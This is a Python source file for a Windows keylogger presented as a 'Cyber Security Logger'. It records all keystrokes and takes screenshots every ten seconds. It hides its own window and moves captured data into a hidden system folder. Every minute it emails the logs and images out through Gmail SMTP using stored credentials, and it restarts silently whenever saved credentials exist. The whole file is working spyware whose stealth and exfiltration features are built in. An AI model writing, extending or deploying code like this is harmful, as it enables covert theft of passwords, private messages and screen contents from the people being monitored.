import tkinter as tk
import threading
import time
import os
import pynput.keyboard
import subprocess
import smtplib
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from PIL import ImageGrab
import glob
import ctypes
import sys

# Directory setup
base_dir = os.path.dirname(os.path.abspath(__file__))
screenshot_dir = os.path.join(base_dir, "screenshots")
log_file = os.path.join(base_dir, "keylogs.txt")
credentials_file = os.path.join(base_dir, "credentials.dat")  # 🔧 new file to store creds

if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)

if not os.path.exists(log_file):
    open(log_file, "w").close()

running = False
listener = None

user_email = ""
user_password = ""

hidden_dir = os.path.join(base_dir, "SystemData")
if not os.path.exists(hidden_dir):
    os.makedirs(hidden_dir)
    ctypes.windll.kernel32.SetFileAttributesW(hidden_dir, 0x02 | 0x04)


def save_credentials(email, password):
    encoded = base64.b64encode(f"{email}|{password}".encode("utf-8"))
    with open(credentials_file, "wb") as f:
        f.write(encoded)

def load_credentials():
    global user_email, user_password
    if os.path.exists(credentials_file):
        with open(credentials_file, "rb") as f:
            data = base64.b64decode(f.read()).decode("utf-8")
            user_email, user_password = data.split("|")
        return True
    return False


def show_login_window():
    login_win = tk.Tk()
    login_win.title("Login to Activate Logger")
    login_win.geometry("350x250")
    login_win.configure(bg="#1E293B")

    tk.Label(login_win, text="Enter Gmail", font=("Consolas", 12), bg="#1E293B", fg="white").pack(pady=10)
    email_entry = tk.Entry(login_win, width=35)
    email_entry.pack()

    tk.Label(login_win, text="App Password", font=("Consolas", 12), bg="#1E293B", fg="white").pack(pady=10)
    pass_entry = tk.Entry(login_win, width=35, show="*")
    pass_entry.pack()

    error_label = tk.Label(login_win, text="", bg="#1E293B", fg="red")
    error_label.pack()

    def submit_credentials():
        email = email_entry.get()
        password = pass_entry.get()
        if not email or not password:
            error_label.config(text="All fields required.")
        else:
            save_credentials(email, password)
            login_win.destroy()
            show_main_gui()

    tk.Button(login_win, text="Login & Save", command=submit_credentials, bg="green", fg="white").pack(pady=15)

    login_win.mainloop()


def log_error(message):
    with open(os.path.join(base_dir, "error_log.txt"), "a") as f:
        f.write(f"{time.ctime()}: {message}\n")

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def keylogger():
    global listener
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def screenshot_capture():
    while running:
        try:
            screenshot_path = os.path.join(screenshot_dir, f"screenshot_{int(time.time())}.jpg")
            img = ImageGrab.grab()
            img.save(screenshot_path, "JPEG")  # Save in JPG format instead of PNG
        except Exception as e:
            log_error(f"Screenshot error: {e}")
        time.sleep(10)
        
        if not running:
            break


def send_email():
    while running:
        try:
            screenshot_path = os.path.join(screenshot_dir, f"screenshot_{int(time.time())}.jpg")  # Changed to JPG
            try:
                img = ImageGrab.grab()
                img.save(screenshot_path, "JPEG")  # Save in JPG format instead of PNG
                time.sleep(1)
            except Exception as e:
                log_error(f"Screenshot before email error: {e}")
                screenshot_path = None

            msg = MIMEMultipart()
            msg['From'] = user_email
            msg['To'] = user_email
            msg['Subject'] = "Security Logger Report"

            # Attach keylog file
            if os.path.exists(log_file):
                with open(log_file, "rb") as f:
                    log_data = MIMEApplication(f.read(), Name="keylogs.txt")
                    log_data['Content-Disposition'] = 'attachment; filename="keylogs.txt"'
                    msg.attach(log_data)

            # Attach screenshot file if it exists
            if screenshot_path and os.path.exists(screenshot_path):
                with open(screenshot_path, "rb") as img_file:
                    img_data = MIMEApplication(img_file.read(), Name=os.path.basename(screenshot_path))
                    img_data['Content-Disposition'] = f'attachment; filename="{os.path.basename(screenshot_path)}"'
                    msg.attach(img_data)

            # Send email
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(user_email, user_password)
                server.send_message(msg)
                print("Email sent!")

            # Move screenshot to hidden folder
            if screenshot_path and os.path.exists(screenshot_path):
                hidden_screenshot_path = os.path.join(hidden_dir, os.path.basename(screenshot_path))
                os.rename(screenshot_path, hidden_screenshot_path)

            # Move keylog file and clear original
            if os.path.exists(log_file):
                hidden_log_path = os.path.join(hidden_dir, "keylogs.txt")
                os.rename(log_file, hidden_log_path)
                open(log_file, "w").close()  # Reset the original log file

        except Exception as e:
            log_error(f"Email sending error: {e}")

        time.sleep(60)

# GUI functions
def start_logging():
    global running
    if not running:
        running = True
        status_label.config(text="Status: Running", fg="lime")
        threading.Thread(target=keylogger, daemon=True).start()
        threading.Thread(target=screenshot_capture, daemon=True).start()
        threading.Thread(target=send_email, daemon=True).start()

def stop_logging():
    global running, listener
    running = False
    if listener:
        listener.stop()
    status_label.config(text="Status: Stopped", fg="red")

def open_keylogs():
    subprocess.Popen(["notepad.exe", log_file])

def open_screenshots():
    os.startfile(screenshot_dir)

# MAIN GUI
def show_main_gui():
    global status_label
    root = tk.Tk()
    root.title("Cyber Security Logger")
    root.geometry("400x350")
    root.configure(bg="#0F172A")
    button_style = {
        "font": ("Consolas", 12, "bold"),
        "width": 20,
        "height": 1,
        "bd": 3,
        "relief": "ridge",
    }

    root.after(3000, hide_window)
    status_label = tk.Label(root, text="Status: Stopped", font=("Consolas", 14, "bold"), fg="red", bg="#0F172A")
    status_label.pack(pady=10)

    tk.Button(root, text="▶ Start Logging", command=start_logging, bg="#00FF00", fg="black", **button_style).pack(pady=5)
    tk.Button(root, text="■ Stop Logging", command=stop_logging, bg="#FF0000", fg="white", **button_style).pack(pady=5)
    tk.Button(root, text="📜 View Keylogs", command=open_keylogs, bg="#0099FF", fg="white", **button_style).pack(pady=5)
    tk.Button(root, text="📂 View Screenshots", command=open_screenshots, bg="#9933FF", fg="white", **button_style).pack(pady=5)
    tk.Button(root, text="⚙ Settings (Coming Soon)", bg="#667899", fg="white", state="disabled", **button_style).pack(pady=5)
    root.mainloop()


def hide_window():
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    ctypes.windll.user32.ShowWindow(hwnd, 0)  # 0 = SW_HIDE

if __name__ == "__main__":
    if load_credentials():
        hide_window()
        running = True
        threading.Thread(target=keylogger, daemon=True).start()
        threading.Thread(target=screenshot_capture, daemon=True).start()
        threading.Thread(target=send_email, daemon=True).start()
        while True:
            time.sleep(1)
    else:
        show_login_window()
